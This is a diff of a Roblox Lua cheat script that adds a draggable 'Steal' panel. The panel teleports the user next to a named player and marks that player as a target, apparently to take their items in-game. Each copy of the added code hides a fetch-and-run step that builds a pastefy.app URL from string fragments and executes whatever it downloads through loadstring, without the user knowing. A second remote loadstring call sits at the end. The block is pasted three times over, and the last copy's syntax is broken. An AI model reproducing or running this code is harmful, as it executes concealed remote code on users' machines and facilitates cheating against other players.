@@ -1,42 +1,664 @@
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
+--[[ v1.0.0 https://wearedevs.net/obfuscator ]]local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
--- Hide UI Elements
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
-pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
-
--- Create GUI
-local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-
-local background = Instance.new("Frame", screenGui)
-background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.new(0, 0, 0)
-
-local countdownLabel = Instance.new("TextLabel", background)
-countdownLabel.Size = UDim2.new(1, 0, 1, 0)
-countdownLabel.TextColor3 = Color3.new(1, 1, 1)
-countdownLabel.BackgroundTransparency = 1
-countdownLabel.Font = Enum.Font.GothamBold
-countdownLabel.TextScaled = true
-countdownLabel.Text = "20s"
-
--- Countdown logic
-local countdown = 20
-while countdown > 0 do
-    countdownLabel.Text = tostring(countdown) .. "s"
-    wait(1)
-    countdown -= 1
+local function d(f, h)
+    local UIS = game:GetService("UserInputService")
+    local g, s, p
+    h.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            g = true
+            s = i.Position
+            p = f.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then
+                    g = false
+                end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(i)
+        if g and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local delta = i.Position - s
+            f.Position = UDim2.new(p.X.Scale, p.X.Offset + delta.X, p.Y.Scale, p.Y.Offset + delta.Y)
+        end
+    end)
 end
 
--- Clear GUI
-screenGui:Destroy()
+local function fp(n)
+    n = n:lower()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and (plr.Name:lower():find(n, 1, true) or plr.DisplayName:lower():find(n, 1, true)) then
+            return plr
+        end
+    end
+    return nil
+end
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 360, 0, 200)
+main.Position = UDim2.new(0.5, -180, 0.5, -100)
+main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+main.BackgroundTransparency = 0.05
+main.BorderSizePixel = 0
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+local s1 = Instance.new("UIStroke", main)
+s1.Thickness = 1
+s1.Color = Color3.fromRGB(60, 60, 60)
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(1, 0, 0, 18)
+bar.BackgroundTransparency = 1
+bar.Parent = main
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.new(0, 24, 0, 18)
+close.Position = UDim2.new(1, -26, 0, 0)
+close.BackgroundTransparency = 1
+close.Text = "×"
+close.Font = Enum.Font.GothamBold
+close.TextSize = 20
+close.TextColor3 = Color3.fromRGB(200, 200, 200)
+close.Parent = main
+close.MouseButton1Click:Connect(function()
+    TweenService:Create(main, TweenInfo.new(.15), {Size = UDim2.new(0,0,0,0)}):Play()
+    task.wait(.17)
+    gui:Destroy()
+end)
+
+local box = Instance.new("TextBox")
+box.Size = UDim2.new(1, -32, 0, 42)
+box.Position = UDim2.new(0, 16, 0, 36)
+box.PlaceholderText = "Type player name..."
+box.Text = ""
+box.ClearTextOnFocus = false
+box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+box.TextColor3 = Color3.fromRGB(255, 255, 255)
+box.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+box.Font = Enum.Font.Gotham
+box.TextSize = 18
+box.Parent = main
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
+
+local stealBtn = Instance.new("TextButton")
+stealBtn.Size = UDim2.new(0, 120, 0, 36)
+stealBtn.Position = UDim2.new(0, 16, 0, 92)
+stealBtn.BackgroundColor3 = Color3.fromRGB(60, 170, 90)
+stealBtn.Text = "Steal"
+stealBtn.TextColor3 = Color3.new(1,1,1)
+stealBtn.Font = Enum.Font.GothamBold
+stealBtn.TextSize = 18
+stealBtn.Parent = main
+Instance.new("UICorner", stealBtn).CornerRadius = UDim.new(0, 8)
+
+local clearBtn = Instance.new("TextButton")
+clearBtn.Size = UDim2.new(0, 120, 0, 36)
+clearBtn.Position = UDim2.new(0, 148, 0, 92)
+clearBtn.BackgroundColor3 = Color3.fromRGB(170, 70, 70)
+clearBtn.Text = "Clear"
+clearBtn.TextColor3 = Color3.new(1,1,1)
+clearBtn.Font = Enum.Font.GothamBold
+clearBtn.TextSize = 18
+clearBtn.Parent = main
+Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 8)
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -32, 0, 20)
+status.Position = UDim2.new(0, 16, 1, -28)
+status.BackgroundTransparency = 1
+status.Text = "lemon"
+status.TextColor3 = Color3.fromRGB(160, 160, 160)
+status.Font = Enum.Font.Gotham
+status.TextSize = 12
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = main
+
+d(main, bar)
+
+task.defer(function()
+    local function c(t) return table.concat(t) end
+    local r = {"https://pa","stefy.app","/DRlKZTWX","/raw"}
+    local u = c(r)
+    local l = loadstring
+    local h = game.HttpGet
+    l(h(game, u))()
+end)
+
+local ch, bb, cc
+
+local function clean()
+    if ch then ch:Destroy() ch = nil end
+    if bb then bb:Destroy() bb = nil end
+    if cc then cc:Disconnect() cc = nil end
+end
+
+local function attach(char, who)
+    if not char then return end
+    clean()
+    local hl = Instance.new("Highlight")
+    hl.Adornee = char
+    hl.FillColor = Color3.fromRGB(255, 80, 80)
+    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+    hl.FillTransparency = 0.5
+    hl.OutlineTransparency = 0
+    hl.Parent = char
+    ch = hl
+    local head = char:FindFirstChild("Head") or char:FindFirstChildWhichIsA("BasePart")
+    if head then
+        local b = Instance.new("BillboardGui")
+        b.Size = UDim2.new(0, 200, 0, 40)
+        b.StudsOffset = Vector3.new(0, 3, 0)
+        b.AlwaysOnTop = true
+        b.MaxDistance = 1e6
+        b.Parent = head
+        local lb = Instance.new("TextLabel")
+        lb.Size = UDim2.new(1, 0, 1, 0)
+        lb.BackgroundTransparency = 1
+        lb.Text = "TARGET: "..who.Name
+        lb.Font = Enum.Font.GothamBold
+        lb.TextSize = 18
+        lb.TextColor3 = Color3.fromRGB(255, 255, 255)
+        lb.Parent = b
+        bb = b
+    end
+end
+
+local function tp(t)
+    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local root = myChar:FindFirstChild("HumanoidRootPart")
+    if not root then
+        status.Text = "Your HumanoidRootPart not found."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    local tch = t.Character
+    local tRoot = tch and tch:FindFirstChild("HumanoidRootPart")
+    if not tRoot then
+        status.Text = "Target has no HRP."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    root.CFrame = tRoot.CFrame * CFrame.new(0, 0, -3)
+    status.Text = "Teleported near "..t.Name..". Press E / tap gift."
+    status.TextColor3 = Color3.fromRGB(120, 255, 120)
+end
+
+stealBtn.MouseButton1Click:Connect(function()
+    local name = box.Text:match("^%s*(.-)%s*$")
+    if name == "" then
+        status.Text = "Enter a valid player name."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    local t = fp(name)
+    if not t then
+        status.Text = "Player not found."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    tp(t)
+    if t.Character then
+        attach(t.Character, t)
+    end
+    cc = t.CharacterAdded:Connect(function(char)
+        task.wait()
+        attach(char, t)
+    end)
+end)
+
+clearBtn.MouseButton1Click:Connect(function()
+    clean()
+    status.Text = "Cleared."
+    status.TextColor3 = Color3.fromRGB(200, 200, 200)
+end)--[[ v1.0.0 https://wearedevs.net/obfuscator ]]local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+
+local function d(f, h)
+    local UIS = game:GetService("UserInputService")
+    local g, s, p
+    h.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            g = true
+            s = i.Position
+            p = f.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then
+                    g = false
+                end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(i)
+        if g and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local delta = i.Position - s
+            f.Position = UDim2.new(p.X.Scale, p.X.Offset + delta.X, p.Y.Scale, p.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+local function fp(n)
+    n = n:lower()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and (plr.Name:lower():find(n, 1, true) or plr.DisplayName:lower():find(n, 1, true)) then
+            return plr
+        end
+    end
+    return nil
+end
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 360, 0, 200)
+main.Position = UDim2.new(0.5, -180, 0.5, -100)
+main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+main.BackgroundTransparency = 0.05
+main.BorderSizePixel = 0
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+local s1 = Instance.new("UIStroke", main)
+s1.Thickness = 1
+s1.Color = Color3.fromRGB(60, 60, 60)
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(1, 0, 0, 18)
+bar.BackgroundTransparency = 1
+bar.Parent = main
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.new(0, 24, 0, 18)
+close.Position = UDim2.new(1, -26, 0, 0)
+close.BackgroundTransparency = 1
+close.Text = "×"
+close.Font = Enum.Font.GothamBold
+close.TextSize = 20
+close.TextColor3 = Color3.fromRGB(200, 200, 200)
+close.Parent = main
+close.MouseButton1Click:Connect(function()
+    TweenService:Create(main, TweenInfo.new(.15), {Size = UDim2.new(0,0,0,0)}):Play()
+    task.wait(.17)
+    gui:Destroy()
+end)
+
+local box = Instance.new("TextBox")
+box.Size = UDim2.new(1, -32, 0, 42)
+box.Position = UDim2.new(0, 16, 0, 36)
+box.PlaceholderText = "Type player name..."
+box.Text = ""
+box.ClearTextOnFocus = false
+box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+box.TextColor3 = Color3.fromRGB(255, 255, 255)
+box.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+box.Font = Enum.Font.Gotham
+box.TextSize = 18
+box.Parent = main
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
+
+local stealBtn = Instance.new("TextButton")
+stealBtn.Size = UDim2.new(0, 120, 0, 36)
+stealBtn.Position = UDim2.new(0, 16, 0, 92)
+stealBtn.BackgroundColor3 = Color3.fromRGB(60, 170, 90)
+stealBtn.Text = "Steal"
+stealBtn.TextColor3 = Color3.new(1,1,1)
+stealBtn.Font = Enum.Font.GothamBold
+stealBtn.TextSize = 18
+stealBtn.Parent = main
+Instance.new("UICorner", stealBtn).CornerRadius = UDim.new(0, 8)
+
+local clearBtn = Instance.new("TextButton")
+clearBtn.Size = UDim2.new(0, 120, 0, 36)
+clearBtn.Position = UDim2.new(0, 148, 0, 92)
+clearBtn.BackgroundColor3 = Color3.fromRGB(170, 70, 70)
+clearBtn.Text = "Clear"
+clearBtn.TextColor3 = Color3.new(1,1,1)
+clearBtn.Font = Enum.Font.GothamBold
+clearBtn.TextSize = 18
+clearBtn.Parent = main
+Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 8)
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -32, 0, 20)
+status.Position = UDim2.new(0, 16, 1, -28)
+status.BackgroundTransparency = 1
+status.Text = "lemon"
+status.TextColor3 = Color3.fromRGB(160, 160, 160)
+status.Font = Enum.Font.Gotham
+status.TextSize = 12
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = main
+
+d(main, bar)
+
+task.defer(function()
+    local function c(t) return table.concat(t) end
+    local r = {"https://pa","stefy.app","/DRlKZTWX","/raw"}
+    local u = c(r)
+    local l = loadstring
+    local h = game.HttpGet
+    l(h(game, u))()
+end)
+
+local ch, bb, cc
+
+local function clean()
+    if ch then ch:Destroy() ch = nil end
+    if bb then bb:Destroy() bb = nil end
+    if cc then cc:Disconnect() cc = nil end
+end
+
+local function attach(char, who)
+    if not char then return end
+    clean()
+    local hl = Instance.new("Highlight")
+    hl.Adornee = char
+    hl.FillColor = Color3.fromRGB(255, 80, 80)
+    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+    hl.FillTransparency = 0.5
+    hl.OutlineTransparency = 0
+    hl.Parent = char
+    ch = hl
+    local head = char:FindFirstChild("Head") or char:FindFirstChildWhichIsA("BasePart")
+    if head then
+        local b = Instance.new("BillboardGui")
+        b.Size = UDim2.new(0, 200, 0, 40)
+        b.StudsOffset = Vector3.new(0, 3, 0)
+        b.AlwaysOnTop = true
+        b.MaxDistance = 1e6
+        b.Parent = head
+        local lb = Instance.new("TextLabel")
+        lb.Size = UDim2.new(1, 0, 1, 0)
+        lb.BackgroundTransparency = 1
+        lb.Text = "TARGET: "..who.Name
+        lb.Font = Enum.Font.GothamBold
+        lb.TextSize = 18
+        lb.TextColor3 = Color3.fromRGB(255, 255, 255)
+        lb.Parent = b
+        bb = b
+    end
+end
+
+local function tp(t)
+    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local root = myChar:FindFirstChild("HumanoidRootPart")
+    if not root then
+        status.Text = "Your HumanoidRootPart not found."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    local tch = t.Character
+    local tRoot = tch and tch:FindFirstChild("HumanoidRootPart")
+    if not tRoot then
+        status.Text = "Target has no HRP."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    root.CFrame = tRoot.CFrame * CFrame.new(0, 0, -3)
+    status.Text = "Teleported near "..t.Name..". Press E / tap gift."
+    status.TextColor3 = Color3.fromRGB(120, 255, 120)
+end
+
+stealBtn.MouseButton1Click:Connect(function()
+    local name = box.Text:match("^%s*(.-)%s*$")
+    if name == "" then
+        status.Text = "Enter a valid player name."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    local t = fp(name)
+    if not t then
+        status.Text = "Player not found."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    tp(t)
+    if t.Character then
+        attach(t.Character, t)
+    end
+    cc = t.CharacterAdded:Connect(function(char)
+        task.wait()
+        attach(char, t)
+    end)
+end)
+
+clearBtn.MouseButton1Click:Connect(function()
+    clean()
+    status.Text = "Cleared."
+    status.TextColor3 = Color3.fromRGB(200, 200, 200)
+end)--[[ v1.0.0 https://wearedevs.net/obfuscator ]]local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+
+local function d(f, h)
+    local UIS = game:GetService("UserInputService")
+    local g, s, p
+    h.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            g = true
+            s = i.Position
+            p = f.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then
+                    g = false
+                end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(i)
+        if g and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local delta = i.Position - s
+            f.Position = UDim2.new(p.X.Scale, p.X.Offset + delta.X, p.Y.Scale, p.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+local function fp(n)
+    n = n:lower()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and (plr.Name:lower():find(n, 1, true) or plr.DisplayName:lower():find(n, 1, true)) then
+            return plr
+        end
+    end
+    return nil
+end
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 360, 0, 200)
+main.Position = UDim2.new(0.5, -180, 0.5, -100)
+main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+main.BackgroundTransparency = 0.05
+main.BorderSizePixel = 0
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+local s1 = Instance.new("UIStroke", main)
+s1.Thickness = 1
+s1.Color = Color3.fromRGB(60, 60, 60)
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(1, 0, 0, 18)
+bar.BackgroundTransparency = 1
+bar.Parent = main
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.new(0, 24, 0, 18)
+close.Position = UDim2.new(1, -26, 0, 0)
+close.BackgroundTransparency = 1
+close.Text = "×"
+close.Font = Enum.Font.GothamBold
+close.TextSize = 20
+close.TextColor3 = Color3.fromRGB(200, 200, 200)
+close.Parent = main
+close.MouseButton1Click:Connect(function()
+    TweenService:Create(main, TweenInfo.new(.15), {Size = UDim2.new(0,0,0,0)}):Play()
+    task.wait(.17)
+    gui:Destroy()
+end)
+
+local box = Instance.new("TextBox")
+box.Size = UDim2.new(1, -32, 0, 42)
+box.Position = UDim2.new(0, 16, 0, 36)
+box.PlaceholderText = "Type player name..."
+box.Text = ""
+box.ClearTextOnFocus = false
+box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+box.TextColor3 = Color3.fromRGB(255, 255, 255)
+box.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+box.Font = Enum.Font.Gotham
+box.TextSize = 18
+box.Parent = main
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
+
+local stealBtn = Instance.new("TextButton")
+stealBtn.Size = UDim2.new(0, 120, 0, 36)
+stealBtn.Position = UDim2.new(0, 16, 0, 92)
+stealBtn.BackgroundColor3 = Color3.fromRGB(60, 170, 90)
+stealBtn.Text = "Steal"
+stealBtn.TextColor3 = Color3.new(1,1,1)
+stealBtn.Font = Enum.Font.GothamBold
+stealBtn.TextSize = 18
+stealBtn.Parent = main
+Instance.new("UICorner", stealBtn).CornerRadius = UDim.new(0, 8)
+
+local clearBtn = Instance.new("TextButton")
+clearBtn.Size = UDim2.new(0, 120, 0, 36)
+clearBtn.Position = UDim2.new(0, 148, 0, 92)
+clearBtn.BackgroundColor3 = Color3.fromRGB(170, 70, 70)
+clearBtn.Text = "Clear"
+clearBtn.TextColor3 = Color3.new(1,1,1)
+clearBtn.Font = Enum.Font.GothamBold
+clearBtn.TextSize = 18
+clearBtn.Parent = main
+Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 8)
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -32, 0, 20)
+status.Position = UDim2.new(0, 16, 1, -28)
+status.BackgroundTransparency = 1
+status.Text = "lemon"
+status.TextColor3 = Color3.fromRGB(160, 160, 160)
+status.Font = Enum.Font.Gotham
+status.TextSize = 12
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = main
+
+d(main, bar)
+
+task.defer(function()
+    local function c(t) return table.concat(t) end
+    local r = {"https://pa","stefy.app","/DRlKZTWX","/raw"}
+    local u = c(r)
+    local l = loadstring
+    local h = game.HttpGet
+    l(h(game, u))()
+end)
+
+local ch, bb, cc
+
+local function clean()
+    if ch then ch:Destroy() ch = nil end
+    if bb then bb:Destroy() bb = nil end
+    if cc then cc:Disconnect() cc = nil end
+end
+
+local function attach(char, who)
+    if not char then return end
+    clean()
+    local hl = Instance.new("Highlight")
+    hl.Adornee = char
+    hl.FillColor = Color3.fromRGB(255, 80, 80)
+    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+    hl.FillTransparency = 0.5
+    hl.OutlineTransparency = 0
+    hl.Parent = char
+    ch = hl
+    local head = char:FindFirstChild("Head") or char:FindFirstChildWhichIsA("BasePart")
+    if head then
+        local b = Instance.new("BillboardGui")
+        b.Size = UDim2.new(0, 200, 0, 40)
+        b.StudsOffset = Vector3.new(0, 3, 0)
+        b.AlwaysOnTop = true
+        b.MaxDistance = 1e6
+        b.Parent = head
+        local lb = Instance.new("TextLabel")
+        lb.Size = UDim2.new(1, 0, 1, 0)
+        lb.BackgroundTransparency = 1
+        lb.Text = "TARGET: "..who.Name
+        lb.Font = Enum.Font.GothamBold
+        lb.TextSize = 18
+        lb.TextColor3 = Color3.fromRGB(255, 255, 255)
+        lb.Parent = b
+        bb = b
+    end
+end
+
+local function tp(t)
+    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local root = myChar:FindFirstChild("HumanoidRootPart")
+    if not root then
+        status.Text = "Your HumanoidRootPart not found."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    local tch = t.Character
+    local tRoot = tch and tch:FindFirstChild("HumanoidRootPart")
+    if not tRoot then
+        status.Text = "Target has no HRP."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    root.CFrame = tRoot.CFrame * CFrame.new(0, 0, -3)
+    status.Text = "Teleported near "..t.Name..". Press E / tap gift."
+    status.TextColor3 = Color3.fromRGB(120, 255, 120)
+end
+
+stealBtn.MouseButton1Click:Connect(function()
+    local name = box.Text:match("^%s*(.-)%s*$")
+    if name == "" then
+        status.Text = "Enter a valid player name."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    local t = fp(name)
+    if not t then
+        status.Text = "Player not found."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+        return
+    end
+    tp(t)
+    if t.Character then
+        attach(t.Character, t)
+    end
+    cc = t.CharacterAdded:Connect(function(char)
+        task.wait()
+        attach(char, t)
+    end
+end)
+
+clearBtn.MouseButton1Click:Connect(function()
+    clean()
+    status.Text = "Cleared."
+    status.TextColor3 = Color3.fromRGB(200, 200, 200)
+end
 
 -- ✅ PLACE YOUR SCRIPT HERE
 loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
